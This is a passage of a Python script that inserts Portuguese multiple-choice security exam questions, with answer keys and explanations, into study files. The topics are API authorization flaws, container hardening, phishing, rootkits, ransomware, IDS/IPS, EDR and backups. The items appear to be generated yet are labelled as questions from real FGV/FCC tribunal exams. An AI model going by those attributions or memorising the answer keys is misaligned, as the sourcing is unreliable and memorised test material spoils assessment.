> - **A)** Incorreta. Vírus de boot afetam inicialização de sistemas operacionais legados, não a lógica de autorização em APIs.
> - **B)** **CORRETA.** A vulnerabilidade **BOLA (Broken Object Level Authorization - API1)** é considerada a falha mais disseminada e severa em APIs REST modernas:
>   - Ocorre quando a aplicação realiza a **Autenticação** com sucesso (o usuário enviou um token válido e o sistema sabe quem ele é), mas negligencia a **Autorização no Nível do Objeto**.
>   - Exemplo: O usuário `auditor_joao` autentica-se e acessa seus próprios relatórios em `/api/relatorios/501`. Se ele simplesmente alterar a URL para `/api/relatorios/502` (pertencente a outro auditor ou de caráter sigiloso) e a API retornar os dados sem conferir se `auditor_joao` tem permissão de leitura sobre o objeto `502`, a falha BOLA é concretizada.
>   - **Mitigação:** Validação obrigatória e rigorosa no backend se o sujeito autenticado detém permissão explícita para manipular aquele identificador de recurso antes de qualquer consulta ou atualização no banco de dados.
> - **C)** Incorreta. Erro 404 significa recurso não encontrado.
> - **D)** Incorreta. Tokens robustos são boa prática, mas tokens válidos não impedem BOLA se a checagem no nível do objeto for esquecida no código do microsserviço.
> - **E)** Incorreta. Trata-se de negação de serviço ou consulta complexa, não falha de autorização de objetos.
> 
> **Gabarito: B**

---
"""

    q11 = """### Questão 11 (FGV - TJ-AP / Analista Judiciário - TI - Hardening em Contêineres Docker e Kubernetes)
A implantação de aplicações em contêineres Docker orquestrados por Kubernetes exige a aplicação sistemática de diretrizes de *Hardening* e segurança preventiva para evitar o comprometimento do nó hospedeiro (*Host*) e movimentos laterais no cluster.

Dentre as boas práticas consagradas de segurança para imagens e execução de contêineres, assinale a afirmativa correta:

* **A)** O processo principal no interior do contêiner deve rodar compulsoriamente como usuário `root` (UID 0) com a flag de execução `--privileged` ativada por padrão para facilitar o acesso irrestrito ao hardware.
* **B)** Devem-se construir imagens de contêiner mínimas (como imagens *Distroless* ou baseadas em Alpine Linux), remover compiladores e utilitários de shell desnecessários em produção, configurar o contêiner para executar com um usuário sem privilégios (*Non-Root User*), montar o sistema de arquivos raiz em modo somente-leitura (`readOnlyRootFilesystem: true`) e escanear periodicamente as imagens contra vulnerabilidades conhecidas com ferramentas de SCA/Container Scanning.
* **C)** O compartilhamento irrestrito do namespace de rede e de processos com o nó hospedeiro (`hostNetwork: true` e `hostPID: true`) é o mecanismo mais seguro recomendado pela CNCF para contêineres de produção.
* **D)** As senhas de banco de dados devem ser gravadas diretamente em texto puro dentro do arquivo `Dockerfile` na diretiva `ENV`.
* **E)** Contêineres dispensam qualquer atualização de segurança, pois o isolamento de namespaces do Linux torna o código 100% impenetrável contra qualquer vulnerabilidade de dia zero.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Rodar como `root` e com a flag `--privileged` destrói o isolamento do contêiner, permitindo que uma invasão na aplicação resulte em escape imediato (*Container Escape*) e controle total do servidor host.
> - **B)** **CORRETA.** Práticas canônicas de **Hardening de Contêineres**:
>   1. **Imagens Mínimas / Distroless:** Reduz drasticamente a superfície de ataque ao expurgar pacotes desnecessários, shells (bash/sh) e ferramentas de pós-exploração (curl, wget, netcat).
>   2. **Execução Non-Root:** Diretiva `USER 10001` no Dockerfile e `runAsNonRoot: true` no SecurityContext do Kubernetes.
>   3. **Sistema de Arquivos Imutável:** Configurar `readOnlyRootFilesystem: true` impede que invasores baixem e persistam malwares no disco do contêiner.
>   4. **Análise Contínua de Imagens:** Ferramentas de varredura (como Trivy, Grype e Clair) integradas ao pipeline CI/CD e ao registro de contêineres.
> - **C)** Incorreta. Habilitar `hostNetwork` e `hostPID` expõe a pilha de rede e a tabela de processos de todo o servidor hospedeiro.
> - **D)** Incorreta. Segredos jamais devem ser hardcoded em imagens Docker; devem ser injetados em tempo de execução via Kubernetes Secrets ou cofres como HashiCorp Vault.
> - **E)** Incorreta. Contêineres compartilham o kernel do hospedeiro; vulnerabilidades de kernel ou falhas nas bibliotecas da aplicação expõem o cluster a ataques severos.
> 
> **Gabarito: B**

---
"""

    # Insert Q06 after 1.3 (before ### 1.4 Injection (#3): SQL Injection vs. Consultas Parametrizadas)
    p1 = "### 1.4 Injection (#3): SQL Injection vs. Consultas Parametrizadas e Modalidades de XSS"
    assert p1 in content
    content = content.replace(p1, q06 + "\n" + p1, 1)

    # Insert Q07 after 1.4 (before ### 1.5 Demais Categorias Críticas: Insecure Design)
    p2 = "### 1.5 Demais Categorias Críticas: Insecure Design, Misconfiguration, SSRF e Supply Chain"
    assert p2 in content
    content = content.replace(p2, q07 + "\n" + p2, 1)

    # Insert Q08 after 1.5 (before ## 2. Abordagem DevSecOps e a Cultura Shift-Left)
    p3 = "## 2. Abordagem DevSecOps e a Cultura Shift-Left"
    assert p3 in content
    content = content.replace(p3, q08 + "\n" + p3, 1)

    # Insert Q09 after 2.1 (before ### 2.2 Modelagem de Ameaças com a Metodologia STRIDE)
    p4 = "### 2.2 Modelagem de Ameaças com a Metodologia STRIDE"
    assert p4 in content
    content = content.replace(p4, q09 + "\n" + p4, 1)

    # Insert Q10 after 3.1 (before ### 3.2 Boas Práticas e Hardening em Contêineres Docker e Kubernetes)
    p5 = "### 3.2 Boas Práticas e Hardening em Contêineres Docker e Kubernetes"
    assert p5 in content
    content = content.replace(p5, q10 + "\n" + p5, 1)

    # Insert Q11 after 3.2 (before ### 3.3 Segurança em Nuvem: Modelo de Responsabilidade Compartilhada)
    p6 = "### 3.3 Segurança em Nuvem: Modelo de Responsabilidade Compartilhada e Proteção de Metadados"
    assert p6 in content
    content = content.replace(p6, q11 + "\n" + p6, 1)

    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print("File 04 successfully enriched! Total questions:", len(re.findall(r"### Questão \d+", content)))


# ==============================================================================
# FILE 05: 05_ameacas_malware_engenharia_social_e_defesa_de_redes.md
# ==============================================================================
def enrich_file_05():
    path = os.path.join(BASE_DIR, "05_ameacas_malware_engenharia_social_e_defesa_de_redes.md")
    count, content = check_file(path)
    if count >= 10:
        print(f"File 05 already has {count} questions, skipping.")
        return

    q06 = """### Questão 06 (FGV - TRT / Analista Judiciário - TI - Modalidades de Phishing e Ataques Sociais)
A Engenharia Social explora fraquezas cognitivas e comportamentais do ser humano (como autoridade, urgência e confiança) para induzir colaboradores a realizarem ações contrárias à segurança institucional.

Dentre as modalidades de ataques baseados em mensagens eletrônicas enganosas, a ação dirigida especificamente contra alvos de alto escalão da administração (tais como Conselheiros de Tribunais, Desembargadores e Diretores Gerais), contendo dados contextuais personalizados colhidos previamente para ludibriá-los a autorizar transações financeiras ilícitas ou vazar informações sigilosas, é tecnicamente classificada como:

* **A)** Phishing Massivo / Genérico.
* **B)** Whaling (ou Fraude do CEO).
* **C)** Ataque de Dicionário em portas SSH.
* **D)** Injeção de SQL em segundo plano.
* **E)** Negação de Serviço por inundação SYN.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. O *Phishing Genérico* é disparado indiscriminadamente para milhões de e-mails de uma só vez, com mensagens padronizadas e sem personalização.
> - **B)** **CORRETA.** Taxonomia de ataques de Phishing:
>   - **Spear Phishing:** Phishing direcionado a um indivíduo, equipe ou organização específica, utilizando informações de contexto verossímeis coletadas em fontes abertas (OSINT).
>   - **Whaling ("Pesca de Baleia" / Fraude do CEO):** Variante de alta especialização do Spear Phishing voltada exclusivamente para **altos executivos, magistrados, conselheiros e diretores de topo** (*big fish*). Os e-mails são extremamente sofisticados, imitando comunicações confidenciais de gabinete, intimações judiciais de urgência ou ordens financeiras de emergência para induzir o tomador de decisão ao erro.
> - **C)** Incorreta. Ataque automatizado de quebra de senhas por força bruta.
> - **D)** Incorreta. Ataque a banco de dados relacional.
> - **E)** Incorreta. Ataque de camada de rede e transporte (TCP).
> 
> **Gabarito: B**

---
"""

    q07 = """### Questão 07 (FCC - TRT / Analista Judiciário - TI - Taxonomia de Malware e Rootkits em Nível de Kernel)
O ecossistema de códigos maliciosos (*malware*) apresenta diversas famílias com objetivos táticos de infecção, espionagem e controle indevido de estações de trabalho.

A respeito da classe de malware conhecida como **Rootkit**, assinale a afirmativa correta:

* **A)** É um vírus simples que se limita a exibir mensagens bem-humoradas na tela do monitor e não altera nenhum arquivo do sistema operacional.
* **B)** É um conjunto de ferramentas maliciosas projetado para manter acesso privilegiado contínuo a um computador, caracterizando-se por sua capacidade de se ocultar ativamente de antivírus e ferramentas de monitoramento do sistema operacional, interceptando chamadas de sistema (*system calls*) e operando frequentemente em modo núcleo (*Kernel Mode / Ring 0*), camuflando processos maliciosos, portas de rede e arquivos no disco.
* **C)** É um spyware que captura apenas teclas digitadas no teclado físico sem nenhuma capacidade de ocultação.
* **D)** É um script em PowerShell inofensivo utilizado exclusivamente para formatar pendrives vazios.
* **E)** Todos os rootkits são eliminados automaticamente pela simples reinicialização do computador no final do dia.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Rootkits são das ameaças mais avançadas e perigosas da cibersegurança.
> - **B)** **CORRETA.** Conceito canônico de **Rootkit**:
>   - O termo deriva de *Root* (usuário administrador em Unix) + *Kit* (pacote de ferramentas).
>   - **Objetivo Primordial:** Garantir a persistência com privilégios máximos e **ocultação profunda**.
>   - **Modo de Operação:** Enquanto softwares de segurança comuns rodam em modo usuário (*User Mode / Ring 3*), os rootkits mais perigosos instalam drivers maliciosos no núcleo do sistema operacional (*Kernel Mode / Ring 0*). Eles modificam a tabela de ponteiros de chamadas de sistema (SSDT / Hooking), de modo que, quando o antivírus ou o Gerenciador de Tarefas solicita a lista de processos ativos, o rootkit intercepta a resposta e apaga suas próprias entradas antes que o usuário as visualize.
> - **C)** Incorreta. Essa é a definição de um *Keylogger*.
> - **D)** Incorreta. Descrição descabida.
> - **E)** Incorreta. Rootkits instalam mecanismos de persistência complexos (no registro, BIOS/UEFI e drivers de boot), sobrevivendo a múltiplos reboots e frequentemente exigindo reinstalação limpa do sistema operacional.
> 
> **Gabarito: B**

---
"""

    q08 = """### Questão 08 (FGV - TJ-AP / Analista Judiciário - TI - Mecânica de Ataques Modernos de Ransomware)
Os ataques cibernéticos de **Ransomware** evoluíram de incidentes isolados de criptografia de arquivos para verdadeiras operações de extorsão corporativa multifacetada operadas sob o modelo *Ransomware-as-a-Service* (RaaS).

A respeito das modalidades contemporâneas de extorsão praticadas por grupos de Ransomware em ataques contra instituições públicas, assinale a afirmativa correta:

* **A)** Na **Dupla Extorsão** (*Double Extortion*), os invasores não apenas bloqueiam o acesso aos dados cifrando os arquivos e discos dos servidores, mas também **exfiltram dados confidenciais** antes da criptografia, ameaçando vazar e publicar documentos sigilosos na Dark Web caso a organização recupere seus sistemas através de backups e recuse o pagamento do resgate.
* **B)** O ransomware moderno decifra os arquivos gratuitamente caso o administrador responda ao e-mail pedindo desculpas formais.
* **C)** Ataques de ransomware utilizam exclusivamente a cifra de César com deslocamento de 3 posições alfabéticas.
* **D)** Na Tripla Extorsão, os criminosos comprometem-se formalmente a doar 50% do valor do resgate para orfanatos locais.
* **E)** O isolamento físico de backups em fitas magnéticas facilita a propagação imediata do ransomware pela rede Wi-Fi.

> **Comentário Detalhado:**
>
> - **A)** **CORRETA.** A evolução tática das modalidades de extorsão por Ransomware:
>   1. **Extorsão Simples:** Criptografa os dados locais e exige resgate para fornecer a chave de decifragem. Foi combatida com sucesso por organizações que mantinham backups saudáveis.
>   2. **Dupla Extorsão (Double Extortion):** Os atacantes furtam/exfiltram gigabytes de dados sensíveis *antes* de rodar a criptografia. Se o tribunal restaurar a base pelos backups e se recusar a pagar, os criminosos chantageiam o órgão ameaçando vazar os dados em portais da Dark Web, gerando multas de LGPD e crise reputacional severa.
>   3. **Tripla Extorsão (Triple Extortion):** Agrega ataques de negação de serviço (DDoS) contra os serviços online do órgão e assédio direto por e-mail/telefone aos cidadãos, clientes ou colaboradores cujos dados foram expostos.
> - **B)** Incorreta. Trata-se de crime organizado internacional que visa lucro financeiro ilícito em criptomoedas.
> - **C)** Incorreta. Empregam criptografia híbrida de padrão militar inquebrável (AES-256 + RSA-4096 / ChaCha20).
> - **D)** Incorreta. A tripla extorsão envolve assédio direto às partes afetadas e ataques DDoS.
> - **E)** Incorreta. Backups físicos desconectados (*Air-Gapped*) são justamente a principal salvaguarda contra contaminação.
> 
> **Gabarito: A**

---
"""

    q09 = """### Questão 09 (FCC - TRT / Analista Judiciário - TI - Defesa de Redes: IDS Passivo vs. IPS In-Line)
Na arquitetura de segurança de rede de um tribunal, analistas de infraestrutura implementam ferramentas de monitoramento de tráfego conhecidas como Sistemas de Detecção de Intrusão (IDS) e Sistemas de Prevenção de Intrusão (IPS).

A respeito da diferença estrutural de implantação e resposta em tempo real entre um **IDS** e um **IPS**, assinale a afirmativa correta:

* **A)** O IDS opera conectado diretamente em linha (*In-Line*) no caminho obrigatório dos pacotes, bloqueando ativamente as conexões suspeitas em frações de segundo.
* **B)** O **IDS** opera tipicamente de forma **passiva fora de linha (*Out-of-Band*)**, recebendo cópias espelhadas do tráfego através de uma porta SPAN/Mirror de um switch ou TAP de rede, analisando os pacotes e gerando alertas administrativos aos analistas do SOC sem poder bloquear o fluxo malicioso em tempo real; ao passo que o **IPS** é implantado **em linha (*In-Line*)** no próprio caminho físico/lógico do tráfego, possuindo capacidade autônoma de descartar pacotes maliciosos (*Drop*), resetar conexões TCP (enviando pacotes TCP RST) e reconfigurar regras de firewall instantaneamente.
* **C)** O IPS só funciona para tráfego gerado por impressoras jato de tinta.
* **D)** Ambos os sistemas dispensam qualquer assinatura de ataque ou análise de anomalias, operando exclusivamente por sorteio aleatório de pacotes.
* **E)** O IDS substitui completamente a necessidade de roteadores e servidores DNS na rede corporativa.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Quem opera em linha (*In-Line*) com capacidade de bloqueio ativo é o **IPS**, e não o IDS.
> - **B)** **CORRETA.** Comparativo arquitetural canônico:
>   - **IDS (Intrusion Detection System):** Implantação passiva (*promiscuous mode* em porta espelho / SPAN). Não introduz nenhuma latência no tráfego da rede e, em caso de pane do IDS, o tráfego corporativo continua fluindo normalmente (*Fail-Open*). Como contrapartida, é **puramente reativo e observacional**: quando o alerta de invasão é emitido, o pacote malicioso já chegou ao destino.
>   - **IPS (Intrusion Prevention System):** Implantação ativa em linha (*In-Line*). Cada pacote de rede atravessa o motor de inspeção do IPS antes de seguir para a sub-rede de destino. Se detectar um padrão malicioso, o IPS **descarta o pacote na hora (*Drop*)**, corta a conexão TCP com pacotes RST e bloqueia o IP de origem. Introduz leve latência no fluxo e exige alta disponibilidade (*Bypass switches*) para não se tornar um ponto único de estrangulamento ou falha.
> - **C)** Incorreta. Trata-se de tecnologia de segurança de redes de dados.
> - **D)** Incorreta. Operam com base em mecanismos sofisticados de assinaturas de ameaças e/ou detecção de anomalias de tráfego.
> - **E)** Incorreta. Dispositivos de segurança complementam a rede, não substituem switches, roteadores e serviços básicos de infraestrutura.
> 
> **Gabarito: B**

---
"""

    q10 = """### Questão 10 (FGV - TRT / Analista Judiciário - TI - Proteção de Endpoints: Antivírus Tradicional vs. EDR e XDR)
A modernização dos Centros de Operações de Segurança (SOC) levou à substituição dos antivírus legados baseados em arquivos por soluções avançadas de detecção e resposta em endpoints (*Endpoint Detection and Response - EDR*) e estendidas (*Extended Detection and Response - XDR*).

A respeito das capacidades operacionais que diferenciam uma solução de **EDR** em relação a um antivírus convencional, assinale a afirmativa correta:

* **A)** O antivírus tradicional atua monitorando telemetria em tempo real no nível do kernel, gravando o histórico de todas as conexões de rede e processos para investigação forense pós-incidente.
* **B)** O antivírus convencional depende primariamente de assinaturas estáticas de arquivos binários conhecidos, mostrando-se ineficaz contra ataques sem arquivos (*Fileless Malware*) e malwares polimórficos de dia zero; enquanto o **EDR** monitora continuamente o comportamento de processos, comandos em memória, injeções de DLL e conexões de rede em tempo real, permitindo aos analistas isolar a máquina remotamente da rede corporativa e reverter alterações maliciosas (*Remediation/Rollback*).
* **C)** O EDR é uma ferramenta de hardware analógica que funciona sem qualquer agente de software instalado nas estações.
* **D)** O antivírus legado é a única tecnologia capaz de neutralizar ataques APT (*Advanced Persistent Threats*) com inteligência artificial.
* **E)** As soluções XDR limitam sua coleta de eventos exclusivamente ao relógio da BIOS de servidores locais.

> **Comentário Detalhado:**
>
> - **A)** Incorreta. Essa é exatamente a descrição das capacidades de telemetria avançada e caça a ameaças (*Threat Hunting*) providas por um **EDR**, e não pelo antivírus tradicional.
> - **B)** **CORRETA.** Salto evolutivo de proteção de endpoints:
>   - **Antivírus Tradicional (EPP Legado):** Focado em prevenção perimetral baseada em assinaturas prévias conhecidas de hashes de arquivos gravados no disco. É cego contra ataques *Fileless* (que rodam em memória via PowerShell ou WMI sem gravar arquivos executáveis no disco) e ameaças inéditas (*Zero-Day*).
>   - **EDR (Endpoint Detection and Response):** Instala um agente leve no endpoint que coleta telemetria comportamental exaustiva (árvore de criação de processos, injeção de threads, tráfego de rede, alterações no registro). Se um comportamento anômalo é detectado (mesmo sem assinatura conhecida), o EDR alerta o SOC, permite a contenção automática (isolamento de rede da máquina infectada com um clique) e facilita a resposta forense. O **XDR** estende essa correlação além dos endpoints, integrando dados de rede, nuvem, identidade e e-mail.
> - **C)** Incorreta. O EDR é uma plataforma de software composta por agentes nos hosts e console na nuvem.
> - **D)** Incorreta. Antivírus legados são notavelmente ineficazes contra ataques APTs sofisticados e direcionados.
> - **E)** Incorreta. O XDR (*Extended Detection and Response*) integra e correlaciona telemetria de múltiplos domínios de segurança (endpoints, redes, servidores de e-mail, firewalls, identidades e nuvem pública).
> 
> **Gabarito: B**

---
"""

    q11 = """### Questão 11 (FGV - TJ-AP / Analista Judiciário - TI - Resiliência e a Regra de Backup 3-2-1 com Imutabilidade)
Na estruturação de um Plano de Continuidade de Negócios e Recuperação de Desastres (DRP) para proteger os bancos de dados do tribunal contra ataques catastróficos de ransomware com dupla extorsão, a equipe de TI deve adotar a consagrada **Regra de Backup 3-2-1** enriquecida com salvaguardas modernas de imutabilidade.

Assinale a afirmativa que expressa de forma correta e completa a aplicação dessa regra de ouro:

* **A)** Manter 3 cópias dos dados (a cópia primária de produção e mais 2 cópias de segurança adicionais), armazenadas em pelo menos 2 tipos de mídias de armazenamento diferentes (ex.: disco rígido/SSD e fita magnética LTO ou armazenamento em nuvem), com pelo menos 1 cópia mantida fora das instalações principais (*Offsite*) ou fisicamente/logicamente isolada da rede corporativa (*Air-Gapped / Imutável com política WORM - Write Once, Read Many*).
* **B)** Fazer backup apenas 3 vezes por ano, com 2 minutos de duração e em 1 único disquete de 3,5 polegadas.
* **C)** Armazenar 3 cópias na mesma pasta da mesma partição do mesmo servidor web para acelerar a leitura.
* **D)** A regra 3-2-1 proíbe o uso de fitas magnéticas e impede qualquer cópia fora do datacenter.
* **E)** Todos os backups devem permitir a exclusão imediata e sem autenticação por qualquer usuário que acesse a rede local via Wi-Fi.

> **Comentário Detalhado:**
>
> - **A)** **CORRETA.** A **Regra de Ouro de Backup 3-2-1** (desenvolvida por Peter Krogh e endossada pelo CISA e NIST):
>   - **3 Cópias dos Dados:** Ter pelo menos três cópias dos dados vitais (a cópia ativa de produção + duas cópias de backup).
>   - **2 Mídias Distintas:** Utilizar pelo menos duas tecnologias ou tipos de mídia de armazenamento diferentes (ex.: disco SAN/NAS + fitas magnéticas LTO ou armazenamento em nuvem de objetos) para evitar falhas de causa comum (como lote de hardware defeituoso ou falha de firmware).
>   - **1 Cópia Offsite / Imutável:** Manter ao menos uma cópia fora do datacenter principal (*Offsite*), em outra localidade geográfica, imune a incêndios ou inundações locais. Na era do ransomware, expande-se para **3-2-1-1-0** (com 1 cópia imutável WORM - *Write Once, Read Many*, na qual nem administradores com credenciais comprometidas conseguem deletar ou criptografar os dados antes do período de retenção expirar, e 0 erros de integridade testados periodicamente).
> - **B)** Incorreta. Frequência descabida e mídia obsoleta.
> - **C)** Incorreta. Viola todos os princípios de resiliência e redundância (ponto único de falha total).
> - **D)** Incorreta. Fitas magnéticas e repositórios fora do site são recomendados exatamente por sua resiliência e capacidade de isolamento da rede (*Air-Gap*).
> - **E)** Incorreta. A facilidade de exclusão permitiria ao invasor ou ransomware destruir os backups antes de detonar a carga maliciosa.
> 
> **Gabarito: A**

---
"""

    # Insert Q06 after 1.2 (before ### 1.3 Canais Alternativos e Golpes Físicos)
    p1 = "### 1.3 Canais Alternativos e Golpes Físicos (Vishing, Smishing, Pretexting e Baiting)"
    assert p1 in content
    content = content.replace(p1, q06 + "\n" + p1, 1)

    # Insert Q07 after 2.3 (before ### 2.4 Ransomware: Criptografia, Dupla/Tripla Extorsão e Defesa)
    p2 = "### 2.4 Ransomware: Criptografia, Dupla/Tripla Extorsão e Defesa"
    assert p2 in content
    content = content.replace(p2, q07 + "\n" + p2, 1)

    # Insert Q08 after 2.4 (before ## 3. Tecnologias de Defesa em Profundidade (Defense-in-Depth))
    p3 = "## 3. Tecnologias de Defesa em Profundidade (Defense-in-Depth)"
    assert p3 in content
    content = content.replace(p3, q08 + "\n" + p3, 1)

    # Insert Q09 after 3.3 (before ### 3.4 Antivírus Tradicional vs. EDR e XDR)
    p4 = "### 3.4 Antivírus Tradicional vs. EDR e XDR"
    assert p4 in content
    content = content.replace(p4, q09 + "\n" + p4, 1)

    # Insert Q10 after 3.4 (before ## 4. Testes de Invasão (PenTest) e Análise de Vulnerabilidades)
    p5 = "## 4. Testes de Invasão (PenTest) e Análise de Vulnerabilidades"
    assert p5 in content
    content = content.replace(p5, q10 + "\n" + p5, 1)

    # Insert Q11 after 5.4 (before ## 6. Fontes Recomendadas na Internet)
    p6 = "## 6. Fontes Recomendadas na Internet"
    assert p6 in content
    content = content.replace(p6, q11 + "\n" + p6, 1)

    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print("File 05 successfully enriched! Total questions:", len(re.findall(r"### Questão \d+", content)))

if __name__ == "__main__":
    enrich_file_02()
    enrich_file_03()
    enrich_file_04()
    enrich_file_05()
